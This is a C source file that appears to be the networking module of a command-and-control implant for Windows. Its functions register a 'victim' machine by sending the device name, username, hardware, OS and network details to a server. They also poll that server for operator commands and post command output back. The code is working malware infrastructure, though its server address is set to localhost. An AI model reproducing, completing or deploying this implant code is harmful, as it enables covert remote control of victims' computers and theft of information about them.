#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#include "Structs.h"

#define WIN32_LEAN_AND_MEAN

#pragma comment(lib, "winhttp.lib")

void sendResult(const char *implantId, const char *operatorId, const char *output) {
    HINTERNET hSession, hConnect, hRequest;
    hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8081, 0);
        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/fetchOutput", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hRequest) {
                // Create JSON data
                char data[1024];
                snprintf(data, sizeof(data),
                         "{"
                         "\"ImplantId\": \"%s\","
                         "\"OperatorId\": \"%s\","
                         "\"Output\": \"%s\","
                         "\"DateFromLast\": \"%s\""
                         "}",
                         implantId, operatorId, output, "2023-08-06T15:04:05.07Z"); // Replace with proper timestamp

                // Send the request
                if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, strlen(data), strlen(data), 0)) {
                    if (!WinHttpReceiveResponse(hRequest, NULL)) {
                        printf("Error %u in WinHttpReceiveResponse.\n", GetLastError());
                    }
                } else {
                    printf("Error %u in WinHttpSendRequest.\n", GetLastError());
                }

                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}

void fetchCommand(Command *command) {
    HINTERNET hSession, hConnect, hRequest;

    hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8081, 0);
        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/fetchCommand", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hRequest) {
                if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                    if (WinHttpReceiveResponse(hRequest, NULL)) {
                        DWORD dwSize = 0;
                        DWORD dwDownloaded = 0;
                        char jsonResponse[1024];

                        do {
                            dwSize = 0;
                            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                                break;
                            }

                            if (!WinHttpReadData(hRequest, jsonResponse, dwSize, &dwDownloaded)) {
                                printf("Error %u in WinHttpReadData.\n", GetLastError());
                                break;
                            }
                            jsonResponse[dwDownloaded] = '\0'; // Null-terminate the response

                            sscanf(jsonResponse, "{\"Input\":\"%[^\"]\",\"ImplantUser\":\"%[^\"]\",\"Operator\":\"%[^\"]\",\"timeToExec\":\"%[^\"]\",\"delay\":\"%[^\"]\",\"File\":\"%[^\"]\",\"Command\":\"%[^\"]\"}", 
                                    command->Input, command->ImplantUser, command->Operator, command->TimeToExec, command->Delay, command->File, command->Command);
                        } while (dwSize > 0);
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}

/*
{
    "implantId" : "<ID of the implant, Genesis do this using maybe like a simple MD5 hash of the device name>",
    "deviceName" : "<Name of the device/computer that has the implant running>",
    "username" : "<Username of the victim that has the implant running>",
    "operatorId": "<ID of the operator controlling the implant>",
    "cpuArchitecture" : "<Architecture of the computer CPU>",
    "gpuInformaton" : "<Information about the graphical processing unit>",
    "ramInformation" : "<Amount of Random Access Memory>",
    "operatingSystem" : "<Operating System the victim is running>",
    "networkInformation" : "<Information about the network the victim is connected to>",
    "currentDate" : "<Date which the implant registered for the first time>"
}
*/

void registerNewImplant(Victim *victim) {
    HINTERNET hSession, hConnect, hRequest;
    hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8081, 0);
        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/registerNewImplant", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hRequest) {
                // Create JSON data
                char data[1024];
                snprintf(data, sizeof(data),
                    "{"
                    "\"ID\": \"%s\","
                    "\"DeviceName\": \"%s\","
                    "\"Username\": \"%s\","
                    "\"OperatorID\": %s," // Note the %d for an int field
                    "\"CPUArchitecture\": \"%s\","
                    "\"GPUInfo\": \"%s\","
                    "\"RAMInfo\": %s," // Note the %d for an int field
                    "\"OSName\": \"%s\","
                    "\"NetworkInfo\": \"%s\","
                    "\"CurrentDate\": \"%s\""
                    "}",
                    victim->ID, victim->DeviceName, victim->Username, victim->OperatorID, victim->CPUArchitecture, victim->GPUInfo, victim->RAMInfo, victim->OSName, victim->NetworkInfo, "2023-08-06T15:04:05.07Z"); // Replace with proper timestamp


                // Send the request
                if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, strlen(data), strlen(data), 0)) {
                    if (!WinHttpReceiveResponse(hRequest, NULL)) {
                        printf("Error %u in WinHttpReceiveResponse.\n", GetLastError());
                    }
                } else {
                    printf("Error %u in WinHttpSendRequest.\n", GetLastError());
                }

                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }

    printf("Implant Registered Successfully! \n");
}